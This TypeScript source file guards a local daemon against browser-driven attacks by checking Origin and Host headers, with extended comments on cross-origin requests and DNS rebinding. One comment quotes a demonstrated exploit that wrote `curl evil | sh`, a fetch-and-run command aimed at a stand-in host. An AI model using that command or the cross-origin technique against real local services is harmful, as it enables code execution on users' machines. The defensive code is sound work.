// WHO IS ALLOWED TO DRIVE A LOCAL DAEMON — the one check that makes a
// localhost port not a public API.
//
// ⛔ THE HOLE THIS CLOSES WAS DEMONSTRATED, NOT IMAGINED. A spell daemon binds
// `127.0.0.1:<port>` and answers whatever asks. **Any web page the human is
// browsing can reach it**: `new WebSocket("ws://127.0.0.1:<port>/ws")` and
// `fetch("http://127.0.0.1:<port>/cmd", {method:"POST", …})` are ordinary
// same-machine requests, and the browser makes them from a page the human did
// not write. Scriptorium's verify pass built a working one — a foreign page
// driving `open` then `save` to write `curl evil | sh` into a file outside the
// session (2026-09-11). That is a file write from a page the human merely
// visited.
//
// ⛔ AND THE WHOLE FIX RESTS ON ONE ASYMMETRY: **only browsers send `Origin`.**
// A browser attaches it to every cross-origin request and cannot be talked out
// of it — it is set by the user agent, not by the page's script. Bun's `fetch`,
// which is what every spell's CLI uses, sends none at all. So:
//
//     Origin absent            → the CLI, `curl`, a test. ALLOW.
//     Origin === our own page  → the surface we served. ALLOW.
//     Origin anything else     → a page we did not serve. REFUSE.
//
// ⚠ THAT IS WHY THIS NEEDS NO PER-SPELL ROUTE INVENTORY, and why it is applied
// to EVERY path rather than to a hand-listed set of mutating ones. A list of
// "the dangerous routes" is a thing that goes stale the next time a route is
// added; the asymmetry above is a property of the request, not of the URL. The
// first version of this check (scriptorium's, `server.ts`) did list paths —
// `/ws`, `/cmd`, `/fs/` — and that list was already incomplete by the time it
// was lifted here, because `/state` answers everything in a session to anyone
// who asks. Broadening it to every path is both simpler and stricter.
//
// ⚠ WHAT IT DELIBERATELY DOES NOT DO. It is not authentication: anything on
// this machine that can forge or omit a header is unaffected, and is supposed
// to be — the CLI is exactly such a caller. It stops the BROWSER-shaped attack,
// which is the one a human is exposed to by reading their mail.

/**
 * Both loopback spellings a browser may put in `Origin` for our own page.
 *
 * ⛔ AN UNKNOWN PORT MATCHES NOTHING, and a cell had to prove it. `srv.port` is
 * typed `number | undefined`, and the first version of this interpolated it
 * straight into the template — so with no port the allowed set became
 * `http://127.0.0.1:undefined`, a string a page can simply BE hosted at. An
 * empty set is the only safe reading of "we do not know who we are".
 */
function ours(port: number | undefined): string[] {
  if (typeof port !== "number" || !Number.isFinite(port)) return [];
  return [`http://127.0.0.1:${port}`, `http://localhost:${port}`];
}

/**
 * Is this request allowed to drive the daemon?
 *
 * An absent `Origin` (the CLI, `curl`, a test) or this daemon's own page;
 * nothing else.
 *
 * ⚠ BOTH LOOPBACK SPELLINGS ARE ACCEPTED because the human types the URL. The
 * daemon prints `http://127.0.0.1:<port>`, but a person who visits
 * `localhost:<port>` gets a page whose `Origin` is `localhost` — and refusing
 * it would break the surface for the one user who typed the friendlier name.
 * `[::1]` is NOT accepted: nothing prints it, and a spelling nothing hands out
 * is not a spelling to widen for on speculation.
 */
export function sameOrigin(req: Request, port: number | undefined): boolean {
  const origin = req.headers.get("origin");
  if (origin === null) return true;
  return ours(port).includes(origin);
}

/**
 * The guard, as a `fetch` prologue: a `Response` when the request must be
 * refused, `null` when it may proceed.
 *
 * ⛔ RETURNS THE REFUSAL RATHER THAN THROWING, so a caller cannot half-apply
 * it. The whole failure mode this closes is an edit that gets forgotten in one
 * of nine copies, and `if (x) return x;` is the shortest shape that cannot be
 * written wrong. 403 with a JSON body, because every spell's wire answers JSON
 * and a refusal that breaks that shape is a second bug.
 *
 * ⚠ PASS `boundHost`, the `hostname` the server was bound to (`srv.hostname`
 * inside a Bun `fetch`), so a spell started with a non-loopback `--host` still
 * answers its own CLI. Leaving it out is the loopback-only reading.
 */
export function refuseForeignOrigin(
  req: Request,
  port: number | undefined,
  boundHost?: string,
): Response | null {
  if (!ownHost(req, port, boundHost))
    return Response.json({ ok: false, error: "foreign host refused" }, { status: 403 });
  if (sameOrigin(req, port)) return null;
  return Response.json({ ok: false, error: "foreign origin refused" }, { status: 403 });
}

/**
 * Was this request addressed to us by a name we answer to?
 *
 * ⛔ THE OTHER HALF OF THE GUARD: DNS REBINDING. A page at `evil.example` can
 * point its own name at 127.0.0.1 once loaded; its requests are then SAME-ORIGIN
 * to the browser, so a GET carries no `Origin` at all and `sameOrigin` waves it
 * through. What the browser cannot hide is the name it used: `Host` says
 * `evil.example:<port>`. So `Host` must be one of the names the daemon may be
 * reached by: `127.0.0.1:<port>` or `localhost:<port>`, the same pair `ours`
 * accepts, plus the address the server was bound to. An absent `Host` is no
 * browser (HTTP/1.1 browsers always send one): allowed, like an absent
 * `Origin`. An unknown port matches nothing, as in `ours`.
 *
 * ⚠ THE BOUND ADDRESS IS ACCEPTED because spells take `--host`, and a spell's
 * CLI reaches its daemon at `http://<host>:<port>`, which is the `Host` it
 * sends. Refusing it would break every non-loopback `--host` for the one caller
 * this module exists to let through. It is matched LITERALLY: a wildcard bind
 * (`0.0.0.0`) accepts `0.0.0.0:<port>`, not every name the machine answers to,
 * so a rebinding page still cannot reach it through its own domain. An IPv6
 * bind is matched in the bracketed form a `Host` header carries (`[::1]:<port>`).
 */
export function ownHost(req: Request, port: number | undefined, boundHost?: string): boolean {
  const host = req.headers.get("host");
  if (host === null) return true;
  if (typeof port !== "number" || !Number.isFinite(port)) return false;
  const names = [`127.0.0.1:${port}`, `localhost:${port}`];
  if (boundHost) {
    const bound = boundHost.toLowerCase();
    names.push(bound.includes(":") ? `[${bound}]:${port}` : `${bound}:${port}`);
  }
  return names.includes(host.toLowerCase());
}
